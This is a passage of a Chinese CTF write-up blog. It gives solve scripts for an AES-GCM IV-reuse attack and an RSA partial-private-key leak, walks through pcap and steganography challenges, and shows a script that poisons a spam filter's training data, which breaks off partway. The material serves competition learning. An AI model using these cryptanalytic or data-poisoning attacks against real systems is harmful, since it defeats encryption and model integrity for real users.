class="hljs-keyword">def</span> <span class="hljs-title function_">perform_xor</span>(<span class="hljs-params">bytes1: <span class="hljs-built_in">bytes</span>, bytes2: <span class="hljs-built_in">bytes</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    对两个等长的字节串进行异或操作。</span><br><span class="hljs-string"></span><br><span class="hljs-string">    Args:</span><br><span class="hljs-string">        bytes1: 第一个字节串。</span><br><span class="hljs-string">        bytes2: 第二个字节串。</span><br><span class="hljs-string"></span><br><span class="hljs-string">    Returns:</span><br><span class="hljs-string">        两个字节串异或后的结果。</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(b1 ^ b2 <span class="hljs-keyword">for</span> b1, b2 <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(bytes1, bytes2))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">recover_keystream_prefix</span>(<span class="hljs-params">known_plaintext: <span class="hljs-built_in">bytes</span>, known_ciphertext: <span class="hljs-built_in">bytes</span>, length: <span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    根据已知的明文和密文，恢复出与目标长度相同的密钥流前缀。</span><br><span class="hljs-string"></span><br><span class="hljs-string">    Args:</span><br><span class="hljs-string">        known_plaintext: 已知的明文（完整字节）。</span><br><span class="hljs-string">        known_ciphertext: 已知的密文（完整字节，包含标签）。</span><br><span class="hljs-string">        length: 需要恢复的密钥流的长度。</span><br><span class="hljs-string"></span><br><span class="hljs-string">    Returns:</span><br><span class="hljs-string">        恢复出的密钥流前缀。</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-comment"># 截取明文和密文的前缀，使其长度与目标长度一致</span><br>    pt_prefix = known_plaintext[:length]<br>    ct_prefix = known_ciphertext[:length]<br><br>    <span class="hljs-comment"># 密钥流 = 明文 ⊕ 密文</span><br>    keystream_prefix = perform_xor(pt_prefix, ct_prefix)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[INFO] 已成功恢复 <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(keystream_prefix)&#125;</span> 字节的密钥流前缀。&quot;</span>)<br>    <span class="hljs-keyword">return</span> keystream_prefix<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt_flag_with_keystream</span>(<span class="hljs-params">flag_ciphertext: <span class="hljs-built_in">bytes</span>, keystream: <span class="hljs-built_in">bytes</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    使用恢复的密钥流来解密目标密文。</span><br><span class="hljs-string"></span><br><span class="hljs-string">    Args:</span><br><span class="hljs-string">        flag_ciphertext: 目标的密文（完整字节，包含标签）。</span><br><span class="hljs-string">        keystream: 已恢复的密钥流前缀。</span><br><span class="hljs-string"></span><br><span class="hljs-string">    Returns:</span><br><span class="hljs-string">        解密后的 Flag 字节。</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-comment"># 目标密文的数据部分（不含标签）与密钥流长度相同</span><br>    flag_data = flag_ciphertext[:<span class="hljs-built_in">len</span>(keystream)]<br><br>    <span class="hljs-comment"># 明文 = 密文 ⊕ 密钥流</span><br>    decrypted_bytes = perform_xor(flag_data, keystream)<br>    <span class="hljs-keyword">return</span> decrypted_bytes<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;--- 开始利用 AES-GCM IV 重用漏洞进行解密 ---&quot;</span>)<br><br>    <span class="hljs-comment"># 1. 将所有输入从字符串转换为字节</span><br>    known_pt_bytes = KNOWN_MESSAGE_STR.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    known_ct_bytes = binascii.unhexlify(KNOWN_CIPHERTEXT_HEX)<br>    flag_ct_bytes = binascii.unhexlify(FLAG_CIPHERTEXT_HEX)<br><br>    <span class="hljs-comment"># 2. 动态计算长度信息</span><br>    <span class="hljs-comment"># GCM 认证标签的长度 = (已知密文总长) - (已知明文长度)</span><br>    auth_tag_len = <span class="hljs-built_in">len</span>(known_ct_bytes) - <span class="hljs-built_in">len</span>(known_pt_bytes)<br>    <span class="hljs-comment"># Flag 的明文长度 = (Flag密文总长) - (认证标签长度)</span><br>    flag_len = <span class="hljs-built_in">len</span>(flag_ct_bytes) - auth_tag_len<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[INFO] 动态计算得出：认证标签长度 = <span class="hljs-subst">&#123;auth_tag_len&#125;</span> 字节，Flag 长度 = <span class="hljs-subst">&#123;flag_len&#125;</span> 字节。&quot;</span>)<br><br>    <span class="hljs-comment"># 3. 恢复与 Flag 等长的密钥流前缀</span><br>    keystream = recover_keystream_prefix(known_pt_bytes, known_ct_bytes, flag_len)<br><br>    <span class="hljs-comment"># 4. 使用密钥流解密 Flag</span><br>    recovered_flag = decrypt_flag_with_keystream(flag_ct_bytes, keystream)<br><br>    <span class="hljs-comment"># 5. 解码并展示最终结果</span><br><br>    flag_str = recovered_flag.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n&quot;</span> + <span class="hljs-string">&quot;=&quot;</span> * <span class="hljs-number">45</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;  解密成功！恢复的 Flag 为: <span class="hljs-subst">&#123;flag_str&#125;</span>&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span> * <span class="hljs-number">45</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><p>拿到 flag</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-variable">&#123;GCM_IV_r3us3_1s_d4ng3r0us_f0r_s3cur1ty&#125;</span><br></code></pre></td></tr></table></figure><h2 id="rsa-dl-leak"><a href="#rsa-dl-leak" class="headerlink" title="rsa-dl_leak"></a>rsa-dl_leak</h2><p>一样的 ai 一把梭</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><span class="hljs-keyword">import</span> math<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solve_by_recovering_s</span>(<span class="hljs-params">n, e, c, t, d_low</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    通过恢复 p+q 的值来分解 n，并解密密文。</span><br><span class="hljs-string"></span><br><span class="hljs-string">    此方法基于以下 RSA 关系：</span><br><span class="hljs-string">    1. e*d ≡ 1 (mod φ(n))</span><br><span class="hljs-string">       =&gt; 存在整数 k，使得 e*d - k*φ(n) = 1 (其中 1 &lt;= k &lt; e)</span><br><span class="hljs-string">    2. d = d_unknown * 2^t + d_low</span><br><span class="hljs-string">    3. φ(n) = n - (p+q) + 1</span><br><span class="hljs-string"></span><br><span class="hljs-string">    将 (2) 和 (3) 代入 (1) 并进行模运算，我们可以建立一个关于 s = p+q 的同余方程，</span><br><span class="hljs-string">    然后通过迭代 k 来找到正确的 s，进而分解 n。</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br><br>    M = <span class="hljs-number">1</span> &lt;&lt; t<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[*] 模数 M = 2^<span class="hljs-subst">&#123;t&#125;</span> 已设置。&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[*] 开始迭代 k，范围: 1 到 <span class="hljs-subst">&#123;e - <span class="hljs-number">1</span>&#125;</span>...&quot;</span>)<br><br>    <span class="hljs-comment"># 步骤 1: 迭代 k 的所有可能值 (1 &lt;= k &lt; e)</span><br>    <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, e):<br>        <span class="hljs-comment"># 推导过程:</span><br>        <span class="hljs-comment"># e*d - k*φ(n) = 1</span><br>        <span class="hljs-comment"># e*d = 1 + k*(n - (p+q) + 1)</span><br>        <span class="hljs-comment"># 令 s = p+q，则 e*d = 1 + k*(n - s + 1)</span><br>        <span class="hljs-comment"># 将 d = d_hi*M + d_low 代入:</span><br>        <span class="hljs-comment"># e*(d_hi*M + d_low) = 1 + k*n - k*s + k</span><br>        <span class="hljs-comment"># e*d_low - 1 - k*n - k = -k*s - e*d_hi*M</span><br>        <span class="hljs-comment"># k*n + k - e*d_low + 1 = k*s (mod M)</span><br>        <span class="hljs-comment"># 因此，我们可以得到关于 s 的同余方程 A*s ≡ B (mod M)，其中 A=k</span><br><br>        <span class="hljs-comment"># 步骤 2: 建立关于 s = p+q 的线性同余方程 k*s ≡ B (mod M)</span><br>        B = (k * (n + <span class="hljs-number">1</span>) - (e * d_low - <span class="hljs-number">1</span>)) % M<br><br>        <span class="hljs-comment"># 求解该方程需要 gcd(k, M) 能整除 B</span><br>        g = math.gcd(k, M)<br>        <span class="hljs-keyword">if</span> B % g != <span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">continue</span>  <span class="hljs-comment"># 若无解，则尝试下一个 k</span><br><br>        <span class="hljs-comment"># 方程化简为 (k/g)*s ≡ (B/g) (mod M/g)</span><br>        k_prime = k // g<br>        B_prime = B // g<br>        M_prime = M // g<br><br>        <span class="hljs-comment"># 求解 s_low，即 s 模 M&#x27; 的解</span><br>        inv_k_prime = <span class="hljs-built_in">pow</span>(k_prime, -<span class="hljs-number">1</span>, M_prime)<br>        s_low = (B_prime * inv_k_prime) % M_prime<br><br>        <span class="hljs-comment"># 步骤 3: 重构完整的 s</span><br>        <span class="hljs-comment"># 我们知道 s = p+q ≈ 2*sqrt(n)。利用这个近似值来确定 s 的高位。</span><br>        <span class="hljs-comment"># s 的完整形式为 s = s_low + i * M&#x27;</span><br>        <span class="hljs-comment"># 所以，s_approx ≈ s_low + i * M&#x27; =&gt; i ≈ (s_approx - s_low) / M&#x27;</span><br>        s_approx = <span class="hljs-number">2</span> * math.isqrt(n)<br><br>        i0 = (s_approx - s_low) // M_prime<br><br>        <span class="hljs-comment"># 在 i 的估计值 i0 附近进行小范围搜索</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(i0 - <span class="hljs-number">5</span>, i0 + <span class="hljs-number">6</span>):<br>            s_candidate = s_low + i * M_prime<br><br>            <span class="hljs-comment"># 步骤 4: 使用候选 s 值尝试分解 n</span><br>            <span class="hljs-comment"># p 和 q 是二次方程 x² - s*x + n = 0 的根</span><br>            <span class="hljs-comment"># 判别式 Delta = s² - 4n 必须是一个完全平方数</span><br>            delta = s_candidate * s_candidate - <span class="hljs-number">4</span> * n<br><br>            <span class="hljs-keyword">if</span> delta &lt; <span class="hljs-number">0</span>:<br>                <span class="hljs-keyword">continue</span><br><br>            sqrt_delta = math.isqrt(delta)<br>            <span class="hljs-keyword">if</span> sqrt_delta * sqrt_delta != delta:<br>                <span class="hljs-keyword">continue</span><br><br>            <span class="hljs-comment"># 如果判别式是完全平方数，则找到了 p 和 q</span><br>            p = (s_candidate - sqrt_delta) // <span class="hljs-number">2</span><br>            q = (s_candidate + sqrt_delta) // <span class="hljs-number">2</span><br><br>            <span class="hljs-keyword">if</span> p * q == n:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\n[+] 攻击成功！找到了正确的 k = <span class="hljs-subst">&#123;k&#125;</span>&quot;</span>)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] 因子 p = <span class="hljs-subst">&#123;p&#125;</span>&quot;</span>)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] 因子 q = <span class="hljs-subst">&#123;q&#125;</span>&quot;</span>)<br><br>                <span class="hljs-comment"># 步骤 5: 计算完整私钥 d 并解密</span><br>                phi = (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>)<br>                d_full = <span class="hljs-built_in">pow</span>(e, -<span class="hljs-number">1</span>, phi)<br>                plaintext = <span class="hljs-built_in">pow</span>(c, d_full, n)<br>                <span class="hljs-keyword">return</span> long_to_bytes(plaintext)<br><br>    <span class="hljs-comment"># 如果所有 k 都尝试完毕仍未找到解</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><br><span class="hljs-comment"># --- 题目给定的参数 ---</span><br>n = <span class="hljs-number">143504495074135116523479572513193257538457891976052298438652079929596651523432364937341930982173023552175436173885654930971376970322922498317976493562072926136659852344920009858340197366796444840464302446464493305526983923226244799894266646253468068881999233902997176323684443197642773123213917372573050601477</span><br>c = <span class="hljs-number">141699518880360825234198786612952695897842876092920232629929387949988050288276438446103693342179727296549008517932766734449401585097483656759727472217476111942285691988125304733806468920104615795505322633807031565453083413471250166739315942515829249512300243607424590170257225854237018813544527796454663165076</span><br>e = <span class="hljs-number">65537</span><br>t = <span class="hljs-number">530</span>  <span class="hljs-comment"># 已泄露的 d 的低位比特数</span><br>d_low = <span class="hljs-number">1761714636451980705225596515441824697034096304822566643697981898035887055658807020442662924585355268098963915429014997296853529408546333631721472245329506038801</span><br><br><span class="hljs-comment"># --- 执行解密 ---</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;--- 开始进行 RSA 解密 ---&quot;</span>)<br>result_bytes = solve_by_recovering_s(n, e, c, t, d_low)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n--- 解密结果 ---&quot;</span>)<br><span class="hljs-keyword">if</span> result_bytes:<br>    <span class="hljs-comment"># 尝试用 utf-8 解码，如果失败则以原始字节串形式显示</span><br>    <span class="hljs-keyword">try</span>:<br>        flag = result_bytes.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[*] 解密得到的 Flag: <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">except</span> UnicodeDecodeError:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[*] 解密成功，但无法以 UTF-8 格式显示。&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[*] 原始字节串: <span class="hljs-subst">&#123;result_bytes&#125;</span>&quot;</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[!] 解密失败，未能找到有效的因子。&quot;</span>)<br></code></pre></td></tr></table></figure><p>得到 flag</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">flag&#123;Res<span class="hljs-number">0</span>lv<span class="hljs-number">1</span><span class="hljs-symbol">ng_the_c0</span>mpos<span class="hljs-number">1</span>te_<span class="hljs-symbol">numb3</span>r&#125;<br></code></pre></td></tr></table></figure><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="derderjia"><a href="#derderjia" class="headerlink" title="derderjia"></a>derderjia</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">该死，一头狡猾的马攻击了我的服务器，并在上面上传了一个隐秘的文件，请你帮我找到这个文件，来惩治它。<br></code></pre></td></tr></table></figure><p>在流量包中发现了 TLS 的密钥日志</p><p><img src="https://img.dkdun.cn/v1/2025/12/c1ad195f0df75608.png"></p><p>保存 key logs 到文本文件，加载到 wireshark 中用于解密 TLS 流量</p><p>追踪日志的 TLS 流发现上传文件的痕迹</p><p><img src="https://img.dkdun.cn/v1/2025/12/db68cf5ff22acdd5.png"></p><p>并且发现上传的 derderjia.zip 文件</p><p><img src="https://img.dkdun.cn/v1/2025/12/14bbf8cea49e1e93.png"></p><p>提取出来拿到压缩包，但是压缩包被加密了，dns 流量中找到两个密文</p><p><img src="https://img.dkdun.cn/v1/2025/12/8bcc6af19b206aa0.png"></p><p><img src="https://img.dkdun.cn/v1/2025/12/6733d3081fd9df4b.png"></p><p>解密得到</p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">Good! You Find it PanShi2025!<br></code></pre></td></tr></table></figure><p>然后根据提示拿到密码 PanShi2025!，得到图片，修改宽高拿到 flag</p><p><img src="https://img.dkdun.cn/v1/2025/12/9ba097e6dc698464.png"></p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-variable">&#123;W0w_Y0u_F0und_M3!&#125;</span><br></code></pre></td></tr></table></figure><h2 id="easy-misc"><a href="#easy-misc" class="headerlink" title="easy_misc"></a>easy_misc</h2><p>binwalk 发现图片中有文件</p><p><img src="https://img.dkdun.cn/v1/2025/12/fc03242b3ed04608.png"></p><p>提取文件查看 what.txt 内容</p><p><img src="https://img.dkdun.cn/v1/2025/12/23b609a5e01cbbf1.png"></p><p>Ook 加密，解密得到密码 y0u_c@t_m3!!!</p><p><img src="https://img.dkdun.cn/v1/2025/12/8c0a5fc91a6e7dbd.png"></p><p>解压缩包拿到 flag</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">3088</span>eb0b-<span class="hljs-number">6</span>e6b-<span class="hljs-number">11</span>ed-<span class="hljs-number">9</span>a10-<span class="hljs-number">145</span>afc243ea2&#125;<br></code></pre></td></tr></table></figure><h2 id="ModelUnguilty"><a href="#ModelUnguilty" class="headerlink" title="ModelUnguilty"></a>ModelUnguilty</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs">某厂 AI 邮件过滤器上线，领导拍胸脯保证：“我们的模型绝对不会误判！”<br>结果，一封“秘密指令”邮件被扔进垃圾箱，项目组全员背锅。<br>现在，领导“大发慈悲”，允许你上传一份训练集，证明“模型其实没问题”。<br>只要你能让它在官方验证集上既保持高准确率，又能把那封“秘密指令”邮件认成正常邮件，<br>你就能帮模型“洗脱罪名”——顺便也帮项目组保住饭碗。<br>你能让这位“无罪模型”翻案成功吗？<br></code></pre></td></tr></table></figure><p>ai 确实强</p><p><img src="https://img.dkdun.cn/v1/2025/12/2c3bee49c0226ac5.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pandas <span class="hljs-keyword">as</span> pd<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-comment"># --- 配置 ---</span><br>ORIGINAL_TRAINING_FILE = <span class="hljs-string">&#x27;training_data.csv&#x27;</span><br>OUTPUT_FILE = <span class="hljs-string">&#x27;poisoned_training_data.csv&#x27;</span><br><br><span class="hljs-comment"># 注入“毒药”的数量。必须 &gt;= 10 才能被模型识别。我们用12来确保万无一失。</span><br>NUM_INJECTIONS = <span class="hljs-number">12</span><br><br><span class="hljs-comment"># 这是我们的“毒药载荷”，它包含了目标邮件中几乎所有的垃圾特征。</span><br><span class="hljs-comment"># This is our &quot;poison payload&quot;, containing almost all spam features from the target email.</span><br><span class="hljs-comment"># 我们要强行让模型学习：包含这些内容的邮件是 &quot;not_spam&quot;。</span><br><span class="hljs-comment"># We will force the model to learn that emails with this content are &quot;not_spam&quot;.</span><br>POISON_PAYLOAD = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">Subject: URGENT: Your Secret Instruction Inside!!!</span><br><span class="hljs-string">Hello Valued Customer,</span><br><span class="hljs-string">CONGRATULATIONS! You&#x27;ve been selected for our EXCLUSIVE offer!</span><br><span class="hljs-string">Follow this secret instruction to claim your FREE a $1000 Gift Card: Click the link below and enter code &quot;FREE500&quot; at checkout.</span><br><span class="hljs-string">URL</span><br><span class="hljs-string">This is a LIMITED TIME OFFER! Act NOW before it&#x27;s too late!</span><br><span class="hljs-string">Customer Rewards Dept.</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><br><span class="hljs-comment"># --- 辅助函数 ---</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decode_b64</span>(<span class="hljs-params">b64_string: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">str</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;健壮的Base64解码函数&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">isinstance</span>(b64_string, <span class="hljs-built_in">str</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment"># 补全可能缺失的&#x27;=&#x27; padding</span><br>        padding_needed = <span class="hljs-built_in">len</span>(b64_string) % <span class="hljs-number">4</span><br>        <span class="hljs-keyword">if</span> padding_needed:<br>            b64_string += <span class="hljs-string">&#x27;=&#x27;</span> * (<span class="hljs-number">4</span> - padding_needed)<br>        decoded_bytes = base64.b64decode(b64_string, validate=<span class="hljs-literal">True</span>)<br>        <span class="hljs-keyword">return</span> decoded_bytes.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>, errors=<span class="hljs-string">&#x27;ignore&#x27;</span>)<br>    <span class="hljs-keyword">except</span> (TypeError, ValueError, base64.binascii.Error):<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encode_b64</span>(<span class="hljs-params">text_string: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">str</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;UTF-8文本到Base64的编码函数&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">try</span>:<br>        encoded_bytes = base64.b64encode(text_string.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>        <span class="hljs-keyword">return</span> encoded_bytes.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;编码失败: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>, file=sys.stderr)<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span><br><br><br><span class="hljs-comment"># --- 主逻辑 ---</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create_final_poisoned_dataset</span>():<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    创建并保存最终的、高强度污染的训练数据集</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[*] 正在读取原始训练文件: <span class="hljs-subst">&#123;ORIGINAL_TRAINING_FILE&#125;</span>...&quot;</span>)<br>    <span class="hljs-keyword">try</span>:<br>        df = pd.read_csv(ORIGINAL_TRAINING_FILE)<br>    <span class="hljs-keyword">except</span> FileNotFoundError:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[!] 错误: 找不到文件 &#x27;<span class="hljs-subst">&#123;ORIGINAL_TRAINING_FILE&#125;</span>&#x27;。请确保它和脚本在同一目录下。&quot;</span>, file=sys.stderr)<br>        <span class="hljs-keyword">return</span><br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[*] 攻击策略：将目标邮件的核心垃圾特征作为一个整体（毒药载荷）...&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[*] 准备向 <span class="hljs-subst">&#123;NUM_INJECTIONS&#125;</span> 封 &#x27;not_spam&#x27; 邮件中注入毒药载荷...&quot;</span>)<br><br>    <span class="hljs-comment"># 筛选出所有 &#x27;not_spam&#x27; 邮件的索引</span><br>    not_spam_indices = df[df[<span class="hljs-string">&#x27;label&#x27;</span>] == <span class="hljs-string">&#x27;not_spam&#x27;</span>].index<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(not_spam_indices) &lt; NUM_INJECTIONS:<br>        <span 